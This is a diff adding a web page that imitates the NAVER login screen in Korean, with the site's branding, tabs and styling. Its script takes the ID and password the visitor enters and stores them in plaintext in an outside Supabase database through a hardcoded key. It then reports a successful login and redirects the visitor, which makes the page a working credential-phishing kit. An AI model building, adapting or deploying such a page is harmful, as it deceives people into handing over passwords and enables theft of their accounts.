@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NAVER 로그인</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #ffffff;
+        }
+
+        .login-container .logo {
+            font-size: 2.5rem;
+            color: #03C75A;
+            font-weight: 800;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            border-radius: 10px;
+            padding: 2rem;
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .input-container {
+            width: 100%;
+            border: 1px solid #dadce0;
+            border-radius: 12px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 20px;
+            margin: 0;
+            border: 1px solid #dadce0;
+            font-size: 1rem;
+            color: #333;
+            position: relative;
+            z-index: 1;
+        }
+
+        .input-field-label {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 1rem;
+            color: #999;
+            pointer-events: none;
+            transition: all 0.3s ease;
+            z-index: 0;
+        }
+
+        
+        .input-field:focus + .input-field-label,
+        .input-field:not(:placeholder-shown) + .input-field-label {
+            font-size: 0.75rem;
+            top: 0px;
+            left: 15px;
+            color: #03C75A;
+        }
+
+        .input-field:focus {
+            padding-top: 30px;
+        }
+
+        .tabs {
+            display: flex;
+            justify-content: space-around;
+            border-bottom: 1px solid #e0e0e0;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 0.5rem;
+            font-size: 0.9rem;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .tab.active {
+            font-weight: bold;
+            color: #03C75A;
+            border-bottom: 2px solid #03C75A;
+        }
+
+        .options {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 0.9rem;
+            color: #767678;
+            margin: 8px 0;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0AB863;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover {
+            background-color: #029a47;
+        }
+
+        .link-container {
+            margin-top: 1rem;
+            font-size: 0.85rem;
+            color: #999;
+            text-align: center;
+        }
+
+        .link-container a {
+            color: #999;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .link-container a:hover {
+            color: #666;
+            text-decoration: underline;
+        }
+
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 34px;
+            height: 20px;
+            color: #09AA5C;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            border-radius: 20px;
+            transition: 0.4s;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 14px;
+            width: 14px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: 0.4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #03C75A;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(14px);
+        }
+
+        .diss-container {
+            font-size: 0.8rem;
+            color: #999;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">NAVER</div>
+
+        <div class="tabs">
+            <div class="tab active">ID/전화번호</div>
+            <div class="tab">일회용 번호</div>
+            <div class="tab">QR코드</div>
+        </div>
+
+        <div class="input-container">
+            <input type="text" class="input-field" id="username" placeholder="아이디 또는 전화번호" required>
+            <label for="username" class="input-field-label">아이디 또는 전화번호</label>
+            <input type="password" class="input-field" id="password" placeholder="비밀번호" required>
+            <label for="password" class="input-field-label">비밀번호</label>
+        </div>
+
+        <div class="options">
+            <div class="checkbox-container">
+                <input type="checkbox" id="keep-logged-in">
+                <label for="keep-logged-in">로그인 상태 유지</label>
+            </div>
+            <div>
+                <label for="ip-security">IP보안</label>
+                <label class="toggle-switch">
+                    <input type="checkbox" id="ip-security" checked>
+                    <span class="slider"></span>
+                </label>
+            </div>
+        </div>
+
+        <button class="login-btn">로그인</button>
+
+        <div class="link-container">
+            <a href="#">비밀번호 찾기</a> |
+            <a href="#">아이디 찾기</a> |
+            <a href="#">회원가입</a>
+        </div>
+    </div>
+
+    
+    <script type="module">
+        // Import Supabase client
+        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+    
+        // Supabase configuration
+        const SUPABASE_URL = 'https://avandialtpvlzzqbrhtl.supabase.co'; // Replace with your Supabase project URL
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF2YW5kaWFsdHB2bHp6cWJyaHRsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzI3Nzc5NzksImV4cCI6MjA0ODM1Mzk3OX0.P06rrmCwOobgDAfGGpEDCwulW2EFw1AiyBTwDyX-jzw'; // Replace with your Supabase anonymous key
+        const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    
+        // Handle form submission
+        document.querySelector(".login-btn").addEventListener("click", async function (event) {
+
+            event.preventDefault(); // Prevent default form submission
+    
+            // Get username and password input values
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+    
+            if (!username || !password) {
+                alert("아이디와 비밀번호를 입력해주세요.");
+                return;
+            }
+    
+            // Check if the username already exists
+            try {
+                const { data: existingUser, error: checkError } = await supabase
+                    .from("users") // Replace with your users table name
+                    .select("*")
+                    .eq("username", username)
+                    .single();
+    
+                if (existingUser) {
+                    alert("이미 존재하는 아이디입니다. 다른 아이디를 입력해주세요.");
+                    return;
+                }
+    
+                if (checkError && checkError.code !== "PGRST116") {
+                    // Ignore "PGRST116" (no rows found) because it means the username is available
+                    console.error("Error checking existing user:", checkError);
+                    alert("오류 발생: 아이디를 확인할 수 없습니다.");
+                    return;
+                }
+            } catch (error) {
+                console.error("Error querying Supabase:", error);
+                alert("오류 발생: " + error.message);
+                return;
+            }
+    
+            // Save new user to the `users` table
+            try {
+                const { data, error } = await supabase
+                    .from("users") // Replace with your users table name
+                    .insert([{ username, password }]);
+    
+                if (error) {
+                    console.error("Error signing up:", error);
+                    alert("로그인에 실패했습니다: " + error.message);
+                    return;
+                }
+    
+                console.log("Signup successful:", data);
+                alert("로그인 성공.");
+                // Redirect to the login page or main page
+                window.location.href = "https://www.example.com/login"; // Replace with your login page URL
+            } catch (error) {
+                console.error("Error saving to Supabase:", error);
+                alert("오류 발생: " + error.message);
+            }
+        });
+    </script>
+    
+    
+</body>
+</html>
+
